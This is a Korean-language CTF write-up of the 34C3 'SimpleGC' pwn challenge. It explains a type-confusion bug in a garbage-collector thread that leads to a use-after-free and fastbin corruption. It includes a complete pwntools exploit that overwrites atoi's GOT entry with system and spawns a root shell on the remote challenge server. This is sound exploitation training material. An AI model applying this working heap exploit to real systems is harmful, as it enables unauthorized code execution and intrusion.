# [2017_34C3CTF] \[PWN] SimpleGC

## Key words

* Garbage collector
* Fastbin
* Type confusion

## Description

```
memory management in C does not have to be hard

Files: Link

Difficulty: easy

Connect: nc 35.198.176.224 1337
```

## Solution

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int *v3; // rsi
  int option; // [rsp+Ch] [rbp-14h]
  pthread_t newthread; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = 0LL;
  pthread_create(&newthread, 0LL, (void *(*)(void *))gabage_collector, 0LL);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Display a group");
    puts("2: Display a user");
    puts("3: Edit a group");
    puts("4: Delete a user");
    puts("5: Exit");
    printf("Action: ", v3);
    v3 = &option;
    if ( (unsigned int)__isoc99_scanf((__int64)"%d", (__int64)&option) == -1 )
      break;
    if ( !option )
      add_400D58();
    if ( option == 1 )
      show_group_401090();
    if ( option == 2 )
      show_user_400FE9();
    if ( option == 3 )
      edit_group_40131B();
    if ( option == 4 )
      delete_user_4011C4();
    if ( option == 5 )
    {
      puts("Bye");
      exit(0);
    }
  }
  exit(1);
}
```

첫 부분에서 쓰레드를 통해 가비지 컬렉터를 돌리는 것을 확인할 수 있습니다.

```c
void __fastcall __noreturn gabage_collector(void *a1)
{
  unsigned int i; // [rsp+18h] [rbp-8h]

  sleep(1u);
  while ( 1 )
  {
    for ( i = 0; i <= 0x5F; ++i )
    {
      if ( group_list_6023E0[i] )
      {
        if ( !LOBYTE(group_list_6023E0[i]->mem_cnt) )
        {
          free(group_list_6023E0[i]->name);
          free(group_list_6023E0[i]);
          group_list_6023E0[i] = 0LL;
        }
      }
    }
    sleep(0);
  }
}
```

특이한 점은 `group_list_6023E0[i]->mem_cnt`의 값을 `LOBYTE`로 받는다는 점입니다. 이 때문에 타입 컨퓨전 버그가 발생합니다.

```c
struct user
{
  int age;
  char *name;
  _QWORD *group;
};
```

```c
struct group
{
  char *name;
  int mem_cnt;
};
```

위는 `user`와 `group` 구조체의 구조 입니다. `mem_cnt`의 타입은 `int`입니다.

```c
group *__fastcall chk_overlap_400BE0(const char *a1)
{
  unsigned __int16 i; // [rsp+1Eh] [rbp-2h]

  for ( i = 0; i <= 0x5Fu; ++i )
  {
    if ( group_list_6023E0[i] && !strcmp(a1, group_list_6023E0[i]->name) && LOBYTE(group_list_6023E0[i]->mem_cnt) )
    {
      ++LOBYTE(group_list_6023E0[i]->mem_cnt);
      return group_list_6023E0[i];
    }
  }
  return 0LL;
}
```

`chk_overlap_400BE0` 함수를 통해 `mem_cnt` 값을 증가시킬 수 있습니다. 만약 `0x100` 만큼 증가시키게 된다면 `gabage collection` 과정에서 `group_list`가 `free` 될 것입니다. group_list가 free 된 후에도 `user` 구조체에는 `group`이 남아있습니다. 이를 통해 `exploit`이 가능합니다.

### add 기능

1. 0x18 크기의 `group->name` 할당
2. 0x10 크기의 `group structure` 할당
3. 0x18 크기의 `user structure` 할당
4. `name` 길이 만큼 `user name` 할당

add 기능의 과정을 이해하고 바로 시나리오로 들어갑시다.

### Exploit Scenario

1. user 추가 (a, b, c, d)
2. edit group 기능을 통해 `mem_cnt` 0x100만큼 증가시켜서 `group`을 `free`시킴 .
3. display user 기능을 통해 heap 주소 릭
4. edit group 기능을 통해 fastbin을 d의 user structure로 변경
5. edit group 기능을 통해 d의 user structure를 atoi의 got로 조작
6. display user 기능을 통해 libc base 주소를 알아냄
7. edit group을 통해 atoi got를 system의 주소로 변경

## Exploit

```python
from pwn import *
import sys, time

def add_user(user_name, group_name, age):
	print p.recvuntil("Action: ")
	p.sendline("0")
	print p.recvuntil("name: ")
	p.sendline(user_name)
	print p.recvuntil("group: ")
	p.sendline(group_name)
	print p.recvuntil("age: ")
	p.sendline(str(age))

def display_group(group_name):
	print p.recvuntil("Action: ")
	p.sendline("1")
	print p.recvuntil("name: ")
	p.sendline(group_name)

def display_user(idx):
	print p.recvuntil("Action: ")
	p.sendline("2")
	print p.recvuntil("index: ")
	p.sendline(str(idx))

def edit_group(idx, yn, group_name):
	print p.recvuntil("Action: ")
	p.sendline("3")
	print p.recvuntil("index: ")
	p.sendline(str(idx))
	print p.recvuntil("(y/n): ")
	p.sendline(yn)
	print p.recvuntil("name: ")
	p.sendline(group_name)

def delete_user(idx):
	print p.recvuntil("Action: ")
	p.sendline("4")
	print p.recvuntil("index: ")
	p.sendline(str(idx))

def leak_mem():
	p.recvuntil("Group: ")
	leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
        log.info("leak : 0x%x" % leak)
	return leak



target = "./sgc"
libc_name = "./libc-2.26.so"
binary = ELF(target)
libc = ELF(libc_name)

if len(sys.argv) == 1:
	p = process(target)
else:
	p = remote("35.198.176.224", 1337)

fake_chunk = p64(0) + p64(0x21)

add_user("aaa", "111", 0)
add_user("bbb", "222", 0)
add_user("ccc", "333", 0)
add_user("\x00", fake_chunk, 0)
delete_user(1)
raw_input()

for i in range(255):
	edit_group(0, "n", "111")
time.sleep(1)

display_user(0)
heap_base = leak_mem() - 0x1c0
log.info("heap base : 0x%x" % heap_base)
raw_input()
fake_chunk_addr = heap_base + 0x2e0
mal_fd = p64(fake_chunk_addr)
edit_group(0, "y", mal_fd)

edit_group(2, "n", "abcdef")

payload = "a"*8 + p64(binary.got['atoi']) * 2
edit_group(2, "n", payload)

display_user(3)
atoi_addr = leak_mem()
system_addr = atoi_addr + (libc.symbols['system'] - libc.symbols['atoi'])
system_addr = atoi_addr + (0x45390-0x36e80)
log.info("system addr : 0x%x" % system_addr)

sss = hex(system_addr).replace("0x","").decode("hex")[::-1]
edit_group(3,"y",sss)
add_user("aa","bb","sh")

p.interactive()
```

## 실행 결과

```
Please enter the user's name: 
Please enter the user's group: 
Please enter your age: 
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
ex.py  libc-2.26.so  sgc
```

